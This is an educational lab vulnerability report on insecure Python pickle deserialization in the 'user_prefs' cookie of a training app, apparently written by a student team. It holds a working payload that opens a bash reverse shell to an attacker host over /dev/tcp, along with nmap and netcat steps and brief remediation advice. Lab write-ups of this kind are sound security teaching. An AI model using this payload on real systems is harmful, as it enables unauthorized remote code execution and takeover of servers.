**CVE-ID**: EDU-DESERIALGATE-2026-T03-006    
**Title**: Insecure Deserialization leading to RCE via Pickle    
**Affected Lab**: deserial-gate  
**Component**: cookies (cookie handler)   
**Severity**: Critical  
**CVSS Vector**: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H  
**CVSS Score**: 9.8  


**Description**:  
The application uses Python's `pickle.loads()` to deserialize user-controlled data stored in the `user_prefs` cookie. Since `pickle` is not secure against erroneous or maliciously constructed data, an attacker can craft a malicious serialized object that executes arbitrary code upon deserialization. This allows unauthenticated Remote Code Execution (RCE) with the privileges of the running service (root).


**Proof of Concept**:  

Payload :

```python
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        cmd = 'bash -c "bash -i >& /dev/tcp/[your machine IP]/4444 0>&1"'
        return (os.system, (cmd,))

payload = base64.b64encode(pickle.dumps(RCE())).decode()
print(payload)
```

**Steps to Reproduce**:  
1. Determine deserial-gate IP by using commands `sudo docker ps` followed by `sudo docker inspect [CONTAINERID]`. Or any other method of choice.
2. Perform nmap scan on the found IP by also enabling the default scripts: `nmap -sV -sC -T5 -p- [deserial-gateIP]`. Output will show a http service at port 5022
3. open the website: `http:[deserial-gateIP]:5022/`
4. Refresh it and navigate to the cookies section via inspect or tool of choice.
5. Start a netcat listener on the attacker machine: `nc -lvnp 4444`
6. Generate the malicious payload using the script above.
7. Replace the cookie value with the generated payload.
8. Refresh the page
9. Observe the reverse shell connection established on the listener.

**Remediation**:
1. Do not use pickle for untrusted user data.
2. Use secure serialization formats like JSON

**Discovered By**: Team 3  
**Date**: 2026-02-17
